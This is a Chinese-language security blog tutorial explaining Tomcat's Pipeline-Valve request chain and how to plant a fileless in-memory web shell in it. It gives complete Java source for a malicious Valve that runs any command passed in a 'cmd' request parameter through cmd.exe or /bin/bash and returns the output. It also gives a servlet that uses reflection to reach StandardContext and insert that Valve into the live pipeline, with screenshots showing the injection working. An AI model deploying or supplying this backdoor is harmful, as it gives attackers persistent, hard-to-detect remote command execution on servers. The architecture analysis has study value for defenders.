## 写在前面

这篇也是在Tomcat容器上面构造的内存马(收回之前说的不搞Tomcat了)，这是建立在Tomcat的管道上面做文章的一个内存马的实现方式。这是内存马系列的第十一篇文章了。

## 前置

### 什么是Pipeline-Valve管道？

根据前面Tomcat架构的相关知识，我们是知道对于Tomcat中的Container层有四个容器：

> Engine
>
> Host
>
> Context
>
> Wrapper

四个容器的具体实现为。

![image-20221001104548654.png](https://image.3001.net/images/20221015/1665810440_634a4008eba46d1500f5f.png!small)

四个容器中都包含有自己的管道对象，管道对象用来存放若干阀门对象。Tomcat为其分别制定了一个默认的基础阀门。

![image-20221001104820970.png](https://image.3001.net/images/20221015/1665810448_634a401071b8d9bc2beaa.png!small)

四个基础阀门放在各自容器管道的最后一位,用于查找下一级容器的管道在每个容器对象里面都有一个pipeline及valve模块。

在上层容器的管道的BaseValue 中会调用下层容器的管道。

对于`Pipeline`处理的流程图如下：

![image-20221001104936955.png](https://image.3001.net/images/20221015/1665810462_634a401edd18f1e643a8e.png!small)

### 流程分析

Container 中的Pipeline 在抽象实现类ContainerBase 中定义。

![image-20221001112443299.png](https://image.3001.net/images/20221015/1665810470_634a4026ecb02f0aed2b3.png!small)

而对于上面提到的标准valve实现，他们都继承了`ContainerBase`类，共同维护了同一个Pipeline对象

并且分别通过调用`startInternal`/`stopInternal`/`destroyInternal`等方法调用相应的生命周期。

![image-20221001112845728.png](https://image.3001.net/images/20221015/1665810479_634a402f5b8ee2f189b5e.png!small)

![image-20221001112905560.png](https://image.3001.net/images/20221015/1665810485_634a40354055241945227.png!small)

![image-20221001112915146.png](https://image.3001.net/images/20221015/1665810492_634a403c12a6f69020352.png!small)

而又因为四个组件都是继承`ContainerBase`，所以，每个组件在执行生命周期的同时也会调用对应方法

我们跟进一下Valve的标准实现`StandardPipeline`，Tomcat将会通过调用`ContainerBase#addValve`方法的方式来将所有的valve通过链表的方式组织起来。

![image-20221001113925509.png](https://image.3001.net/images/20221015/1665810499_634a40430e89b76c05d35.png!small)

进而调用的是`pipeline.addValve`方法，进而是`StandardPipeline#addValve`方法的调用。

![image-20221001114632635.png](https://image.3001.net/images/20221015/1665810511_634a404fc13d53d8cafbb.png!small)

因为我并没有配置多余的Valve，所以，这个容器只有一个基础阀`（this.first=null）`将valve赋值给first变量，并且设置
valve的下一个阀门为基础阀。如果这里的first不为空，遍历阀门链表，将要被添加的阀门设置在 基础阀之前。

对于其生命周期的实现：

因为`StandardPipeline`类继承至`LifecycleBase`,
所以其分别调用`startInternal`/`stopInternal`/`destroyInternal`方法来进行执行

startlnternal 方法和stopInternal 方法处理的过程非常相似，都是使用临时变量current 来遍历Value 链里的所有Value
，如果first 为空则使用basic ，然后遍历所有Value 并调用相应的start 和stop
方法，然后设置相应的生命周期状态。destroyInternal 方法是删除所有Value。

![image-20221001115859113.png](https://image.3001.net/images/20221015/1665810523_634a405b1a751027f38b0.png!small)

而该类对于请求处理的方法为：

Connector 在接收到请求后会调用最顶层容器的Pipeline 来处理，顶层容器的Pipeline 处理完之后就会在其BaseValue
里调用下一层容器的Pipeline 进行处理．这样就可以逐层调用所有容器的Pipeline 来处理了

我们可以定位到`CoyoteAdapter#service`方法中。

![image-20221001120136313.png](https://image.3001.net/images/20221015/1665810534_634a4066e5f0163ca2a38.png!small)

在进行连接请求的时候，将会获取顶层容器的`Pipeline`，调用其invoke方法进行处理。

![image-20221001120314439.png](https://image.3001.net/images/20221015/1665810542_634a406ec8221d74543d1.png!small)

虽然对应的`StandardPipeline`中的first为null,
但是可以调用其`getFirst`方法，获取到`basic`中的Valve，这里存放的就是下一层的Valve对象。

![image-20221001120505743.png](https://image.3001.net/images/20221015/1665810597_634a40a52153bee1901cc.png!small)

之后又调用下一层的invoke方法。

![image-20221001120742448.png](https://image.3001.net/images/20221015/1665810603_634a40abc228fe43135b1.png!small)

## 正文

### 分析注入

通过上面的分析，我们可以知道，在处理请求的时候，`Pipeline`管道主要是通过调用`Valve`的`invoke`方法来进行处理请求的。

所以，如果我们能够创建一个恶意的Valve，并将其添加进入Valve链中，那么在处理请求的时候，将会调用我们创建的Valve的invoke方法，进而执行恶意代码。

根据上面的分析，我们可以知道，对于Valve的添加，主要是通过`StandardPipeline#addValve`方法进行添加。

![image-20221001124921944.png](https://image.3001.net/images/20221015/1665810610_634a40b27e3763451e6e6.png!small)

将会将我们构建的`Valve`添加在first之后，basic之前。

### 实现内存马

总结一下步骤就应该为两步

  1. 创建一个恶意的Valve

  2. 调用`StandardPipeline#addValve`方法将其添加进Valve链

首先处理第一步，根据前面的分析，一个符合条件的恶意Valve是需要继承`ValveBase`这个抽象类的。

![image-20221001125506003.png](https://image.3001.net/images/20221015/1665810619_634a40bb29889ddefc7ae.png!small)

所以我们继承了之后，重写其`invoke`方法。

    
    
    package pres.test.momenshell;
    
    import org.apache.catalina.connector.Request;
    import org.apache.catalina.connector.Response;
    import org.apache.catalina.valves.ValveBase;
    
    import javax.servlet.ServletException;
    import java.io.IOException;
    import java.util.Scanner;
    
    public class EvilValve extends ValveBase {
        @Override
        public void invoke(Request request, Response response) throws IOException, ServletException {
            String cmd = request.getParameter("cmd");
            if (cmd != null) {
                try {
                    java.io.PrintWriter printWriter = response.getWriter();
                    ProcessBuilder processBuilder;
                    String o = "";
                    if (System.getProperty("os.name").toLowerCase().contains("win")) {
                        processBuilder = new ProcessBuilder(new String[]{"cmd.exe", "/c", cmd});
                    } else {
                        processBuilder = new ProcessBuilder(new String[]{"/bin/bash", "-c", cmd});
                    }
                    java.util.Scanner scanner = new Scanner(processBuilder.start().getInputStream()).useDelimiter("\\A");
                    o = scanner.hasNext() ? scanner.next() : o;
                    scanner.close();
                    printWriter.println(o);
                    printWriter.flush();
                    printWriter.close();
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }
    }
    

之后第二步就是获取`StandardPipeline`，调用其addValve方法。

    
    
    package pres.test.momenshell;
    
    import org.apache.catalina.core.StandardContext;
    
    import javax.servlet.ServletContext;
    import javax.servlet.ServletException;
    import javax.servlet.http.HttpServlet;
    import javax.servlet.http.HttpServletRequest;
    import javax.servlet.http.HttpServletResponse;
    import java.io.IOException;
    import java.lang.reflect.Field;
    
    public class AddTomcatValve extends HttpServlet {
        @Override
        protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
            this.doPost(req, resp);
        }
    
        @Override
        protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
            try {
                ServletContext servletContext = req.getServletContext();
                StandardContext o = null;
                //循环获取 StandardContext对象
                while (o == null) {
                    Field context = servletContext.getClass().getDeclaredField("context");
                    context.setAccessible(true);
                    Object object = context.get(servletContext);
    
                    if (object instanceof ServletContext) {
                        servletContext = (ServletContext) object;
                    } else if (object instanceof StandardContext) {
                        o = (StandardContext) object;
                    }
                }
                // 添加自定义的Valve
                EvilValve evilValve = new EvilValve("aaa");
                o.getPipeline().addValve(evilValve);
                resp.getWriter().println("add successfully!!");
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
    

这里是直接创建了一个Servlet进行注入，对于如何从当前线程中获取对应的`StandardContext`对象的各种方法总结将会在后面单独有一篇来讲述。之后在`web.xml`中进行配置，就可以访问这个Servlet了。

### 实例

相关的代码上面都有了，我们直接来看看效果，访问`/addTomcatValve`路由。

![image-20221001152228180.png](https://image.3001.net/images/20221015/1665810656_634a40e01f53e8834a09c.png!small)

成功注入内存马，我们测试是否成功注入。

![image-20221001152303281.png](https://image.3001.net/images/20221015/1665810661_634a40e5499a7941af58f.png!small)

明显，成功写入了内存马。

## 总结

 **注入流程**

>   1. 创建一个恶意的Valve
>
>   2. 获取`StandardContext`类对象
>
>   3. 调用`StandardPipeline#addValve`方法将其添加进Valve链
>
>

